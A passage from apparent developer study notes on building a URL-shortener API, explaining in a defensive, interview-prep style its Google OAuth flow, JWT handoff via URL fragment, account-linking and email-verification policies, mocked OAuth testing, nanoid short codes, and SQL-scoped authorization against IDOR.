  token — it wasn't issued for that purpose, its expiry/lifetime is
  controlled by Google (not tunable via this app's `JWT_EXPIRES_IN`), and
  every route that checks it would need Google-specific verification
  logic instead of the one `verifyToken` this app already has.
- Storing Google's access/refresh tokens "just in case a future feature
  needs them" — this phase never calls a Google API on the user's
  behalf, so there's nothing to refresh or store; adding that machinery
  speculatively is exactly the kind of scope creep this phase avoids.

**Production considerations.** Because both auth paths converge on the
same `signToken`/`verifyToken`, any future session-related change
(rotation, shorter expiry, a revocation list) is written once and
automatically covers both password and OAuth users — there's no second
"OAuth session" system to keep in sync.

**Interview answer.** Google's tokens describe a relationship with
Google — an access token scoped to Google's APIs, an identity token
whose validity Google controls. Neither maps to "is this a valid Click
Scope session." So after verifying the Google identity, I sign our own
JWT the exact same way `signup`/`login` already do, and nothing
downstream — `requireAuth`, `GET /me` — has any idea whether a given
token came from a password or a Google login. One session mechanism,
regardless of how the user originally authenticated.

---

### The redirect handoff: why the JWT goes in the URL fragment, not a query string

**What it is.** The callback's final redirect carries our JWT as
`${FRONTEND_URL}#token=...` — a URL fragment — not
`${FRONTEND_URL}?token=...`, a query string. This was a late correction:
the first version of this phase used a query string, on the reasoning
that it matched the `token` field name `signup`/`login` already return
in their JSON bodies. That reasoning missed a real difference between
the two cases — a JSON body isn't logged by intermediaries the way a
request URL is — and a security review of the diff caught it.

**Why it exists in this project.** A query string is part of the actual
HTTP request line the browser sends. That means it can end up in: this
server's own access logs, any reverse proxy or CDN sitting in front of
it, and the `Referer` header of any *subsequent* outbound request the
landing page makes (an analytics beacon, a font/CDN fetch, an ad
script) — none of which should ever see a live bearer token for this
app's session. A URL fragment (everything after `#`) is fundamentally
different: it's a client-side-only construct. Browsers never include it
in the request line sent to a server, so none of those log/Referer
leakage paths apply to it at all.

**How it works mechanically.** `res.redirect(\`${config.FRONTEND_URL}#token=${encodeURIComponent(token)}\`)`
— from the server's perspective this looks almost identical to the
query-string version, but the browser treats everything after `#`
specially: it's available to client-side JavaScript via
`window.location.hash`, but is stripped before the browser ever
constructs the actual GET request line for that navigation (and for any
same-origin requests the page subsequently makes, since fragments aren't
part of what gets echoed into `Referer` either). The frontend (out of
scope for this phase, but worth stating for whoever builds it) should
read `window.location.hash` once, then immediately call
`history.replaceState(null, '', window.location.pathname)` to scrub the
token out of the visible URL and browser history entry — the fragment
approach avoids *transmission* leakage, not persistence in history.

**Where it lives in the codebase.** The final `res.redirect(...)` in the
`/google/callback` handler, `src/routes/auth.ts`. The `?error=oauth_denied`
redirect for denied consent, by contrast, deliberately stays a query
string — it carries no secret, and query strings are the conventional,
bookmarkable, log-safe place for a non-sensitive status indicator.

**Common pitfalls.**

- Reusing a JSON-response field name/shape as justification for a URL
  parameter without re-checking the actual transmission path — a value
  that's safe inside a JSON body (never logged verbatim by default, not
  part of any URL) is not automatically safe as a URL query parameter,
  which travels through a completely different set of intermediaries.
- Treating the fragment switch as a complete fix — it closes the
  server-side/log/Referer leakage path specifically, but the token still
  lands in browser history once the frontend has read it, until the
  frontend explicitly scrubs the URL with `history.replaceState`.

**Production considerations.** Two more robust alternatives exist for
when the frontend is actually built (out of this phase's scope, which is
API-only, no frontend): setting the JWT as an `HttpOnly`, `Secure`,
`SameSite=Lax` cookie directly in the redirect response (eliminates
client-side JS exposure entirely, but requires the API and frontend to
share a registrable domain or accept cross-site cookie complexity), or
redirecting with a short-lived, single-use *exchange code* that the
frontend immediately POSTs to a dedicated token-exchange endpoint
(keeps the real JWT out of any URL at all, at the cost of one more
endpoint and one more round trip). Both are meaningfully bigger design
decisions — cookie domain/CORS implications, or new API surface — than
this phase's fix, which only needed to close the log/Referer leakage
path for now.

**Interview answer.** I initially put the JWT in a query string,
matching the field name `signup`/`login` already return in JSON — but a
query string is part of the actual request line, so it ends up in
server access logs, proxy/CDN logs, and potentially a `Referer` header
if the landing page makes any outbound request afterward. A URL
fragment never gets sent to a server at all — browsers strip it before
constructing the request line — so moving the token there closes that
specific leakage path. It's not a complete fix on its own: the token
still sits in browser history until the frontend scrubs it with
`history.replaceState`, and a cookie-based session or a one-time
exchange-code endpoint would remove the URL-based transmission
entirely — reasonable next steps once there's an actual frontend to
build against.

---

### Account linking: the takeover vulnerability, the email_verified claim, and the rejection policy

**What it is.** The policy decision in `findOrCreateOAuthUser`: if a
Google login's email matches an *existing password account*, reject with
409 rather than silently attaching the Google identity to that account
("auto-linking").

**Why it exists in this project.** Auto-linking by email is a real
account-takeover vector. Consider: a victim signs up for Click Scope
with `victim@example.com` and a password, but never verifies that email
(if this app ever adds email verification) — or more simply, consider
any system where email ownership isn't cryptographically tied to the
account. An attacker who does not own `victim@example.com` can still
often create a *Google* account using that same address as a recovery/
contact email, or — more directly relevant here — if this app ever
trusted an *unverified* email claim from any provider, an attacker could
register anywhere with `victim@example.com` and get auto-linked into the
victim's existing account, gaining full access to it. The
`email_verified` claim in Google's `id_token` is what would make
auto-linking *conditionally* safe: Google only sets it `true` after
Google itself confirmed the user controls that mailbox (via Google's own
signup/verification flow), so an auto-link gated strictly on
`email_verified === true` is a meaningfully different, much safer claim
than "an email string matches." This phase's policy is simpler still:
reject the match entirely, regardless of `email_verified`, rather than
build and reason carefully about a conditional auto-link now.

**How it works mechanically.** In `findOrCreateOAuthUser`, the
`(oauth_provider, oauth_id)` lookup runs *first*; if it misses, a second
lookup by `lower(email)` checks for a password account. A hit there is
necessarily a password account (an OAuth match would have already
returned above), so it throws `conflict('An account with this email
already exists — sign in with your password')` — a 409 — and creates no
row. The `users_password_xor_oauth_check` constraint (Phase 2) is never
touched or relaxed; this policy is enforced in application logic, one
layer above a schema that was never asked to allow the ambiguous case in
the first place.

**Where it lives in the codebase.** `src/services/authService.ts`,
`findOrCreateOAuthUser`'s second `SELECT`; the callback route in
`src/routes/auth.ts` propagates the thrown `AppError` as a raw 409 JSON
response (not a redirect — see the "handling denied consent" subsection
below for the contrast).

**Common pitfalls.**

- Auto-linking on *any* email match without checking `email_verified` —
  this is the exact takeover vector described above; even a
  conditional auto-link needs that claim as its gate, and this phase
  chose not to build the conditional version at all yet.
- Silently merging accounts instead of rejecting — from the legitimate
  password-account owner's perspective, a silent merge is
  indistinguishable from an attacker successfully taking over their
  account, even when it happens to be the "real" Google-owning user
  triggering it. Rejecting with a clear message keeps that ambiguity out
  of the system entirely.

**Production considerations — the UX cost.** A real user who signed up
with a password and later tries "Sign in with Google" using the same
email hits a 409, not a seamless merge — they have to remember they
already have a password account and use it instead. That's a genuine
rough edge for a small fraction of returning users, traded deliberately
for never having a linking bug be exploitable. The route currently
surfaces this 409 as raw JSON rather than a `FRONTEND_URL?error=...`
redirect (see the next subsection's contrast with denied-consent
handling) — a real deployment would likely want to catch this
specific `AppError` in the callback and redirect with an error indicator
instead, giving the frontend something to render a helpful message from,
rather than dropping the user on an API's bare JSON response mid-navigation.

**Interview answer.** Auto-linking a new OAuth login to an existing
account just because the email string matches is an account-takeover
vector — an attacker who can get any provider to hand them a token
claiming a victim's email would be silently merged into the victim's
account. The `email_verified` claim is what makes a conditional version
of auto-linking safe, because it means the *provider* already confirmed
mailbox ownership, not just that a string matches. For this phase I
chose to reject the match outright rather than build that conditional
path — a password-account owner trying Google sign-in gets a clear 409
telling them to use their password, at the cost of a rougher experience
for that specific case, in exchange for not having to reason carefully
about a linking feature's edge cases before it's actually needed.

---

### Rejecting unverified emails: closing the account-squatting gap

**What it is.** `findOrCreateOAuthUser` throws `badRequest('Google
account email is not verified')` if `emailVerified` is `false`, before
running either of its two `SELECT`s or its `INSERT` — a check added
after the initial implementation, once a security review pointed out the
account-linking rejection policy above only covers *linking to an
existing account*, not *creating a new one*.

**Why it exists in this project.** The account-linking subsection above
explains why `email_verified` is the gate that makes *linking* safe —
but the same claim matters just as much for plain account *creation*,
for a different reason: `users_email_lower_unique_idx` (Phase 2) makes
email globally unique across every user, OAuth or password. If this
function created an OAuth account for an email Google itself hasn't
verified, an attacker could squat on someone else's real email address —
say, one Google lets you add as an unverified contact/recovery address
without proving ownership — and that row would then permanently occupy
this app's unique-email slot for that address. The real owner, trying to
sign up later with a password, would hit the same 409 "email already
exists" this app uses for a legitimate duplicate — except there's no
legitimate account to point them to, only an attacker's OAuth account
they never created and can't access. Rejecting unverified emails outright
means every row this app ever creates for an email address corresponds
to someone Google itself has confirmed controls that mailbox.

**How it works mechanically.** The check is the very first line inside
`findOrCreateOAuthUser`, before even the `(oauth_provider, oauth_id)`
lookup — so an unverified identity is rejected without a single query
running, not just before the `INSERT`. This is stricter than "only check
before creating a new row": it also means a *returning* OAuth user would
be rejected on a login where Google's response reports `email_verified:
false`, which in practice shouldn't happen for an account that was
already created (creation itself now requires `true`), but keeps the
invariant absolute rather than conditional on which branch of the
function is about to run.

**Where it lives in the codebase.** The `if (!emailVerified) throw
badRequest(...)` guard at the top of `findOrCreateOAuthUser`,
`src/services/authService.ts`. Covered by
`tests/services/authService.test.ts` (asserts 400 and zero rows created)
and `tests/routes/googleAuth.test.ts` (same assertion through the full
HTTP callback).

**Common pitfalls.**

- Checking `email_verified` only at the account-*linking* branch (the
  email-collision `SELECT`) and assuming that's sufficient — it isn't;
  the squatting risk exists purely from *creating* a row, with no
  existing account required for an attacker to cause harm.
- Defaulting `emailVerified` to `true` anywhere upstream "to keep things
  simple" — `oauthService.ts`'s `exchangeCodeForIdentity` already
  defaults a missing claim to `false` (the safe direction), and this
  check is what makes that default actually matter.

**Production considerations.** This makes Google's `email_verified`
claim a hard requirement for using this app via Google sign-in at all —
a small number of real Google accounts may have an unverified primary
email in unusual configurations (e.g. certain legacy or enterprise
setups), and those users would see a 400 with no path forward via OAuth.
That's an accepted tradeoff for this phase: correctness of the unique-
email invariant over accommodating every possible Google account
configuration.

**Interview answer.** The account-linking rejection policy stops an
attacker from attaching an unverified Google identity to someone else's
*existing* password account, but that alone doesn't stop them from
*creating* a brand-new account with someone else's unverified email —
which would squat on this app's globally-unique email slot and lock the
real owner out of ever signing up with their own address. So
`findOrCreateOAuthUser` now rejects any Google identity with
`email_verified: false` outright, before running a single query — every
row this app creates corresponds to an email Google has actually
confirmed the user controls.

---

### Find-or-create ordering: provider identity first, email second

**What it is.** `findOrCreateOAuthUser` looks up
`(oauth_provider, oauth_id)` before it ever looks at `email` — the order
matters, not just the fact that both checks exist.

**Why it exists in this project.** Google's `sub` claim (the OAuth
subject id) is documented as stable and never reused — "a Google account
can have multiple emails at different points in time, but the sub value
is never changed" (per Google's own token payload docs). Email is not
stable: a user can change the email address on their Google account at
any time. If this app keyed OAuth users on email instead, a user who
changes their Google email would look, on their next login, like a
brand-new person — either creating a duplicate account (losing access to
their links/history under the old identity) or, worse, silently landing
on whatever *other* account currently holds that new email string,
depending on how such a system were built. Keying on `(provider,
oauth_id)` first sidesteps both failure modes: the *same* Google account
is always recognized as the same Click Scope user, regardless of what
email it currently reports.

**How it works mechanically.** `SELECT ... WHERE oauth_provider = $1
AND oauth_id = $2` runs first and, on a hit, returns immediately — the
`email` argument for that call isn't even consulted once a
provider-identity match is found (deliberately: this function doesn't
sync the stored email to a changed Google email either, which is a
separate policy decision left out of scope for this phase). Only on a
miss does the function fall through to the email-collision check
described in the account-linking subsection above.

**Where it lives in the codebase.**
`src/services/authService.ts`, `findOrCreateOAuthUser`'s first `SELECT`
(the identity lookup) versus its second `SELECT` (the collision check).
The `users_oauth_identity_unique` constraint
(`UNIQUE(oauth_provider, oauth_id)`, Phase 2) is what makes this lookup
meaningful as an identity key at the database level, not just in
application logic.

**Common pitfalls.**

- Looking up by email first "because it's simpler" — this silently
  reintroduces the email-instability bug this ordering exists to avoid,
  even if both checks are eventually present.
- Assuming `provider` alone is enough — `oauth_id` (Google's `sub`) is
  only unique *within* a provider; the composite `(provider, oauth_id)`
  is the actual identity key, which is why `users_oauth_identity_unique`
  is a two-column constraint, not a unique index on `oauth_id` alone.

**Production considerations.** If a second OAuth provider is ever added,
this ordering pattern (provider-identity lookup first, email-collision
check second, only on a miss) is the one to repeat — not a redesign.

**Interview answer.** I look up OAuth users by `(provider, oauth_id)`
before ever touching email, because Google's `sub` claim is guaranteed
stable while email isn't — a user can change their Google email at any
time. Keying on email first would mean a user who changes their email
either gets treated as a new signup, losing their existing account, or
in a worse design, lands on whatever account currently owns that new
email string. The provider's subject id is the actual identity; email is
just contact information that happens to also be useful for detecting a
collision with a *different* signup method, which is a separate check
run only when the identity lookup misses.

---

### How Phase 2's password_hash XOR constraint already accommodated OAuth users

**What it is.** `findOrCreateOAuthUser` needed no migration — `users`
already had `oauth_provider`, `oauth_id`, a nullable `password_hash`, the
`users_oauth_identity_unique` constraint, and
`users_password_xor_oauth_check`, all added in Phase 2, well before this
phase's OAuth logic existed.

**Why it exists in this project.** Phase 2's schema design anticipated
exactly this: "a user must authenticate via exactly one method... never
both, never neither" (Notes.md Phase 2). That XOR was written as a
general rule about the shape of a valid row, not as a rule specific to
password auth — so when this phase needed to add a second authentication
method, the schema had already made room for it.

**How it works mechanically.** `findOrCreateOAuthUser`'s `INSERT`
statement lists `(email, oauth_provider, oauth_id, email_verified)` and
never mentions `password_hash` — the column simply stays at its default
(`NULL`) by omission, the same way `signup`'s `INSERT` lists
`(email, password_hash)` and never mentions `oauth_provider`/`oauth_id`,
leaving those `NULL`. Both inserts satisfy the XOR constraint by
construction — neither function has to check or enforce the rule
itself, because there's no code path in either one capable of setting
both sets of columns at once.

**Where it lives in the codebase.**
`migrations/20260810111606772_create-users-table.ts` (unmodified by this
phase — confirmed via `git diff migrations/`);
`src/services/authService.ts`'s `signup` and `findOrCreateOAuthUser`,
whose `INSERT` column lists are each other's complement.

**Common pitfalls.**

- Assuming a new authentication method always needs a schema change —
  it doesn't, if (as here) the schema was already designed around "one
  of several methods" rather than "the one method that currently
  exists."
- Writing an `INSERT` that explicitly sets `password_hash = NULL` for an
  OAuth user instead of simply omitting the column — functionally
  identical (the column defaults to `NULL` either way), but omission
  makes the two `INSERT` statements' *shapes* visibly mirror the XOR
  rule itself; explicitly writing `NULL` obscures that symmetry for a
  future reader.

**Production considerations.** If a third authentication method is ever
added (a third-party SSO, a magic-link flow), the XOR constraint as
written (`password_hash` vs. `oauth_provider`/`oauth_id` as two mutually
exclusive branches) would need to become a genuine "exactly one of N"
rule, or more likely be redesigned around a separate `auth_methods`
table — two branches hardcoded into one `CHECK` doesn't generalize
cleanly past two methods.

**Interview answer.** This phase needed zero migrations, because Phase 2
designed the `users` table around "exactly one authentication method,"
not around password auth specifically — the OAuth columns, their unique
constraint, and the XOR check were all already there. `signup` and
`findOrCreateOAuthUser` satisfy that constraint by construction: each
`INSERT` only ever mentions the columns for its own method and leaves
the other method's columns at their `NULL` default, so there's no code
path in either function that could even attempt to violate the rule.

---

### Handling denied consent and provider errors as expected outcomes, not server errors

**What it is.** When a user clicks "Cancel" on Google's consent screen,
Google redirects back with `?error=access_denied` (and no `code`) rather
than failing to redirect at all. The callback handler checks for this
*after* validating `state` but *before* attempting anything that assumes
a `code` exists, and responds with a redirect, not a thrown `AppError`.

**Why it exists in this project.** A user declining to sign in with
Google is a completely normal, expected branch of this flow — not a bug,
not an attack, not a reason to log a server error or return a 5xx/
generic-4xx. Treating it as an error would be both semantically wrong
(nothing failed; the user made a choice) and bad UX (a raw JSON error
body instead of landing back on the app).

**How it works mechanically.** The callback's query schema
(`googleCallbackQuerySchema` in `src/routes/auth.ts`) makes `code` and
`error` both optional — Google sends exactly one of them, never both.
After `state` is validated (first, unconditionally — see the state
parameter subsection for why this ordering matters even here), the
handler checks `if (error)` and, if present, logs it at `warn` level
(`req.log.warn({ error }, ...)`, never at `error` level — this isn't a
server fault) and redirects to `FRONTEND_URL?error=oauth_denied` without
touching `exchangeCodeForIdentity` or `findOrCreateOAuthUser` at all. A
subsequent `if (!code)` catches the one remaining edge case — a
callback with neither `error` nor `code`, which shouldn't happen from
Google itself but is still handled explicitly (400) rather than left to
crash on a `null` code further down.

**Where it lives in the codebase.** The `if (error)` / `if (!code)`
branches in the `/google/callback` handler, `src/routes/auth.ts`,
positioned after `consumeState` and before `exchangeCodeForIdentity`.

**Common pitfalls.**

- Checking `error` before `state` — this project deliberately validates
  `state` first, so a forged callback URL carrying
  `error=access_denied` and no valid state is rejected with 400 rather
  than being treated as "the real user politely declined."
- Logging denied consent at `error` severity — it pollutes error
  dashboards/alerting with an entirely normal, frequent user action;
  `warn` (or even `info`) is the appropriate level.
- Forgetting the "neither `error` nor `code`" case — an easy gap to miss
  since it's not something Google itself produces, but defensive
  handling here is cheap and avoids a confusing crash if it ever does
  happen (a proxy stripping a query param, a malformed manual request).

**Production considerations.** `?error=oauth_denied` on the frontend
redirect is a generic indicator, not Google's raw `error` value passed
through verbatim — deliberately: Google's error codes aren't meant for
end-user display, and passing them through unfiltered would require the
frontend to handle an open-ended, Google-controlled vocabulary instead
of one stable value this API defines.

**Interview answer.** A user declining Google's consent screen is a
normal outcome, so the callback treats `?error=access_denied` as a
redirect back to the frontend with an indicator, not a thrown error —
logged at `warn`, not `error`, since nothing actually failed. The
ordering matters: state is validated before `error` is ever inspected,
so an attacker can't forge a callback claiming "denied" to sneak past
without a valid state. And a callback with neither `code` nor `error` —
not something Google itself sends, but reachable by a hand-crafted
request — still gets an explicit 400 rather than falling through to a
crash.

---

### Testing an external OAuth provider without hitting the real API

**What it is.** The three-layer test strategy this phase uses instead of
calling real Google endpoints: `nock` intercepts the one real outbound
HTTP call (`getToken`'s POST to Google's token endpoint); `verifyIdToken`
is stubbed directly with `vi.spyOn`, returning a canned `LoginTicket`;
everything else (state lifecycle, the callback route's own logic,
`findOrCreateOAuthUser`) runs against this project's real local
Postgres/Redis, exactly like every other test in this codebase.

**Why it exists in this project.** This is the first genuine external-
network dependency in the test suite — every other test hits a real
*local* instance of its dependency (Postgres, Redis), which this project
can spin up in Docker Compose; there is no equivalent "real local
Google." Hitting the actual Google API from tests would be slow, flaky
in CI, and explicitly out of scope for this phase.

**How it works mechanically.** `tests/services/oauthService.test.ts`
uses `nock('https://oauth2.googleapis.com').post('/token').reply(...)`
to fake Google's token response, and
`vi.spyOn(OAuth2Client.prototype, 'verifyIdToken')` to fake the verified-
identity result — constructed as a real `LoginTicket` instance (from
`google-auth-library` itself) carrying a hand-built `TokenPayload`, not
an ad hoc object shape. Critically, one test asserts
`expect(spy).toHaveBeenCalledWith(expect.objectContaining({ idToken:
'fake-id-token', audience: clientId }))` — because `verifyIdToken` is
fully stubbed, every *other* test in the file would still pass even if
the real code stopped passing the correct `audience`; the mock returns
its canned payload regardless of what it's called with. That one
assertion is what stands between "we call `verifyIdToken` correctly" and
a silent regression. `tests/routes/googleAuth.test.ts` mocks only
`exchangeCodeForIdentity` (via `vi.mock` with `importOriginal`, so
`buildGoogleAuthUrl` — pure string-building, no network — still runs
for real), letting the callback route's own logic (state validation,
error handling, find-or-create, the redirect) be exercised end-to-end
against real Redis and Postgres.

**Where it lives in the codebase.**
`tests/lib/oauthState.test.ts` (state lifecycle, real Redis);
`tests/services/oauthService.test.ts` (nock + `vi.spyOn`, including the
audience-assertion test); `tests/services/authService.test.ts`'s
`findOrCreateOAuthUser` describe block (pure DB, no mocking);
`tests/routes/googleAuth.test.ts` (supertest + `vi.mock`, real DB/Redis).

**Common pitfalls.**

- Mocking a verification call's *output* without ever asserting its
  *input* — see the audience-assertion point above; this is the specific
  gap flagged during this phase's planning, not a hypothetical.
- Mocking more than necessary — `buildGoogleAuthUrl` is pure and
  network-free, so mocking it too (rather than letting the `/google`
  route test exercise the real thing) would hide a real bug in URL
  construction behind a fake.
- Assuming a green test suite here proves Google-side integration works
  — it doesn't, and the next subsection is explicit about that gap.

**Production considerations — the residual gap.** Signature verification
*correctness itself* — does `verifyIdToken` actually reject a forged
token, an expired one, one with the wrong audience — is trusted entirely
to `google-auth-library`'s own test suite, not exercised by this
project's. This project's tests only prove two things: that our code
calls `verifyIdToken` with the right arguments, and that our code
handles its output correctly. They cannot catch a bug *inside* the
library. In a system where that residual risk mattered more — handling
financial transactions, or a security-sensitive multi-tenant boundary —
the right mitigation wouldn't be hand-rolling JWKS verification in-house
just to make it testable; it would be adding a small number of
integration tests that run against Google's *real* token endpoint in CI,
using a real, low-privilege test Google Cloud OAuth client, kept on a
separate, slower CI tier from the fast mocked unit suite — specifically
to catch the case where a `google-auth-library` upgrade or a config
change silently breaks real-world verification in a way no mock could
reveal.

**Interview answer.** I mock the one real network call (`nock` on
Google's token endpoint) and stub `verifyIdToken`'s return value
directly, rather than hitting the real Google API from tests. The
important detail is that mocking `verifyIdToken`'s *output* alone leaves
a blind spot — since the mock returns the same canned result regardless
of input, a regression that broke the `audience` argument would pass
silently — so I added a test asserting `verifyIdToken` is *called with*
our `GOOGLE_CLIENT_ID`. Even so, this test suite can't prove Google's own
signature-verification logic is correct — that's trusted to the
library's own tests. If that residual risk mattered more, the fix
wouldn't be hand-rolling JWKS verification to make it "testable" —
it'd be a slower, separate CI tier of integration tests against Google's
real endpoint with a disposable test OAuth client.

---

## Phase 6: Link Management

### New dependency: nanoid

**What it is.** `nanoid` is a tiny, dependency-free ID generator. Its
default export produces a URL-safe random string from a CSPRNG;
`customAlphabet(alphabet, length)` — the part actually used here — builds
a generator constrained to a specific character set and length instead of
nanoid's own default alphabet/size.

**Why it exists in this project.** A link needs a short, unpredictable
identifier: short so `clickscope.io/<code>` is actually shorter than the
original URL, unpredictable so an attacker can't guess or enumerate
other users' short codes and land on private destinations. Neither
requirement is satisfied by what's already in the codebase —
`crypto.randomUUID()` (zero new dependency) produces a 36-character
string, far too long for a "short" link; hand-rolling a generator on top
of `Math.random()` would be short but not unpredictable (see the CSPRNG
section below for why that matters concretely). `nanoid` is the smallest
addition that's both short and cryptographically unpredictable.

**How it works mechanically.** `src/lib/shortCode.ts` calls
`customAlphabet(ALPHABET, DEFAULT_SHORT_CODE_LENGTH)` once at module load
to build a reusable generator function, then `generateShortCode()` just
invokes it. Under the hood, `customAlphabet` pulls raw bytes from
Node's `crypto.randomBytes` (a CSPRNG, see below) and maps them onto the
given alphabet via rejection sampling, so every character of the output
is uniformly distributed across the 62-character set — no character is
subtly more likely than another the way a naive `bytes % 62` mapping
would produce.

**Where it lives in the codebase.** `src/lib/shortCode.ts`
(`generateShortCode`, `ALPHABET`, `DEFAULT_SHORT_CODE_LENGTH`); the
`nanoid` entry in `package.json` `dependencies`.

**Common pitfalls.**

- Reaching for `Math.random()` because it's already there and "it's just
  an ID, not a password" — the whole point of Phase 4's CSPRNG-vs-`Math.random()`
  reasoning for tokens applies just as much to an identifier that gates
  access to a resource.
- Using nanoid's *default* alphabet (which includes `-` and `_`) instead
  of `customAlphabet` with an explicit set — this project's alphabet is a
  deliberate, separate decision from "whatever nanoid ships with", see
  the alias-charset discussion below.

**Production considerations.** None beyond what's already true of any
small, actively-maintained dependency: pin a specific major version
(`^5.1.16`, not the just-released `6.x`) rather than being an early
adopter of a security-relevant package's major bump, and keep an eye on
its changelog for CSPRNG-relevant fixes.

**Interview answer.** I added `nanoid` for short-code generation because
it wraps Node's CSPRNG (`crypto.randomBytes`) instead of `Math.random()`,
which matters for an identifier that gates access to a link's
destination — a predictable generator would let an attacker guess or
enumerate other users' codes. I considered `crypto.randomUUID()` (already
available, no new dependency) but a UUID's 36 characters defeats the
point of a "short" link, and a hand-rolled `Math.random()` generator
would be short but not unpredictable.

---

### Authentication vs. authorization

**What it is.** Authentication answers "who is making this request?" —
in this app, verifying a JWT and extracting the `sub` claim as
`req.userId`. Authorization answers a different question: "is this
specific, authenticated identity allowed to do this specific thing to
this specific resource?" The two are independent axes — a request can be
perfectly authenticated (a valid, unexpired token for a real user) and
still not authorized (that user doesn't own the link they're asking to
delete).

**Why it exists in this project.** Every route through Phase 5 only
needed authentication: `GET /api/auth/me` returns *the caller's own*
data by construction (it reads `req.userId`, there's no other id
involved). Link routes are the first place a request names a resource
that might belong to someone else — `GET /api/links/:id` takes an `id`
from the URL that has no necessary relationship to `req.userId` at all.
Proving the token is valid says nothing about whether *this* token's
owner is allowed to see *that* particular row.

**How it works mechanically.** `requireAuth` (unchanged from Phase 4)
handles authentication only — it populates `req.userId` and nothing
else; it has no idea what resource the request is about. Authorization
is a second, separate step that happens inside `linkService`'s query
layer, on every single function: `getLink`, `updateLink`, and
`deleteLink` all take `(userId, linkId)` and fold both into one SQL
`WHERE` clause (see the next section for exactly how). Authentication
answers "whose request is this", authorization is enforced by literally
constraining what data that identity's queries can touch.

**Where it lives in the codebase.** Authentication:
`src/middleware/auth.ts` (`requireAuth`). Authorization:
`src/services/linkService.ts` — every exported function that takes a
`linkId` also takes and uses a `userId`.

**Common pitfalls.**

- Treating "the route is behind `requireAuth`" as sufficient security for
  a per-resource action — `requireAuth` proves identity, not permission;
  every route in `src/routes/links.ts` needs both.
- Checking authorization in the route/controller layer with an
  `if (link.userId !== req.userId)` after an unscoped fetch — technically
  achieves the same *result* as this phase's approach in the common case,
  but is structurally weaker; see the next section for why.

**Production considerations.** At larger scale this often grows into a
dedicated authorization layer (policy objects, an ACL table, a rules
engine) once resources have more than one owner-and-owner-only shape —
e.g. shared/team links, read-only collaborators. Nothing in this phase
needs that yet: single-owner resources with a `user_id` foreign key are
the simplest case, and the SQL-scoping pattern below is proportionate to
that simplicity.

**Interview answer.** Authentication proves who's asking; authorization
decides what they're allowed to touch. `requireAuth` handles the first
and stops there — it just puts a user id on the request. The second is a
separate concern this phase introduces for the first time in this
codebase, because it's the first phase where an authenticated request can
name a resource — a link id — that doesn't inherently belong to the
caller. I enforce it in the query layer itself rather than as a
post-fetch check, which the next section covers in detail.

---

### Object-level authorization enforced in SQL vs. a post-fetch `if`

**What it is.** Two ways to implement "only let a user act on their own
resource." Approach A: fetch the resource by its id alone, then compare
`resource.userId === req.userId` in application code, and reject if not.
Approach B: bake the ownership condition directly into the query that
fetches (or updates, or deletes) the resource — `WHERE id = $1 AND
user_id = $2` — so a row belonging to someone else is never returned to
the application layer in the first place.

**Why it exists in this project.** `linkService.ts` uses approach B
everywhere. The reason isn't stylistic — it's that approach A has a
structural weakness approach B doesn't: it depends on every single call
site remembering to write, and correctly write, the `if` check. Add a
new route, a new internal helper, a future admin endpoint reusing
`getLink` — any one of those can forget the check, or get the comparison
backwards (`!==` vs `===` is a classic typo), and the bug is silent:
requests just start succeeding for the wrong user. Approach B makes that
category of mistake structurally impossible, because there is no code
path where an unscoped row ever exists in memory to leak.

**How it works mechanically.** Every function in `src/services/linkService.ts`
that touches an existing row takes `(userId, linkId)` and puts both into
one WHERE clause:

```ts
export async function getLink(userId: string, linkId: string): Promise<Link | null> {
  const result = await query<LinkRow>(
    `SELECT ${LINK_COLUMNS} FROM links WHERE id = $1 AND user_id = $2`,
    [linkId, userId],
  );
  const row = result.rows[0];
  return row ? toLink(row) : null;
}
```

`updateLink` and `deleteLink` do the same — the `WHERE` clause on the
`UPDATE`/`DELETE` statement itself is the check, not a separate `SELECT`
followed by a comparison. Postgres either finds a matching row (this
user, this link) or it doesn't; there is no third state where a row
exists but the query "found" it and then application code has to decide
whether to hand it back.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`getLink`, `updateLink`, `deleteLink`, and `listLinks` (which scopes by
`user_id` alone, no specific `linkId`) all follow this pattern.

**Common pitfalls.**

- The single most common real-world version of this bug: `SELECT * FROM
  links WHERE id = $1`, then `if (link.user_id !== req.userId) throw
  forbidden()` — works fine until someone adds a second call site to the
  unscoped fetch and forgets the check, or a refactor moves the check
  above the fetch instead of after it.
- Believing input validation (checking `id` is a well-formed UUID) has
  anything to do with authorization — a syntactically valid UUID that
  belongs to another user is a perfectly valid *request*, just not an
  authorized one. Validation and authorization are separate concerns
  addressed by separate mechanisms in this codebase (Zod for the former,
  the SQL WHERE clause for the latter).

**Production considerations.** This exact pattern is the right level of
solution for single-owner, foreign-key-scoped resources. It stops
generalizing once a resource can have multiple legitimate viewers with
different permission levels (owner can delete, collaborator can only
read) — that needs an explicit permissions table or policy layer, not
more WHERE clauses. Postgres Row-Level Security (`CREATE POLICY`) is
another production option for enforcing this at the database layer
itself, so even a buggy or compromised application-layer query can't
bypass it — worth knowing about, not adopted here since a single
`WHERE user_id = $2` clause per query already gives the same guarantee
at this scale without RLS's operational complexity (every connection
needs the right session variable set correctly, migrations get trickier).

**Interview answer.** I fold the ownership check into the query itself —
`WHERE id = $1 AND user_id = $2` — rather than fetching by id alone and
comparing in application code afterward. The difference matters because
the post-fetch `if` check depends on every call site remembering to
write it correctly; forget it once, in one new route or helper function,
and that's a silent authorization bypass. Scoping it in the query makes
that class of bug impossible to introduce by omission — there's no code
path where an unscoped row is ever in memory to accidentally return.

---

### Broken access control as an OWASP vulnerability class

**What it is.** "Broken Access Control" is OWASP's top-ranked web
application risk category (A01:2021 in the OWASP Top 10) — access
control failures where an authenticated user can act on data or
functionality they shouldn't be able to reach. The specific shape
relevant here is **IDOR** (Insecure Direct Object Reference): an
endpoint takes an identifier — a URL id, a query param — directly from
the client and uses it to fetch a resource without verifying the caller
actually owns or has permission to access that specific object.

**Why it exists in this project.** `GET /api/links/:id` is a textbook
IDOR shape: it takes `id` straight from the URL. Without the SQL-scoping
from the previous section, any authenticated user could enumerate UUIDs
(or, more realistically, obtain one link id legitimately and then try
adjacent/predictable ones, or simply try ids seen in another user's
shared link) and read, edit, or delete a link that isn't theirs — while
still passing `requireAuth` with a perfectly valid token. This is
exactly the gap authentication alone cannot close.

**How it works mechanically.** IDOR isn't a single bug pattern to grep
for — it's a category defined by what's *missing*: an authorization
check between "the request named a resource" and "the resource was
acted on." In this codebase specifically, it would look like a route or
service function that took an `id` and ran a query against it without
also constraining by `user_id` — the exact thing every function in
`linkService.ts` avoids.

**Where it lives in the codebase.** Not any one file — it's a property
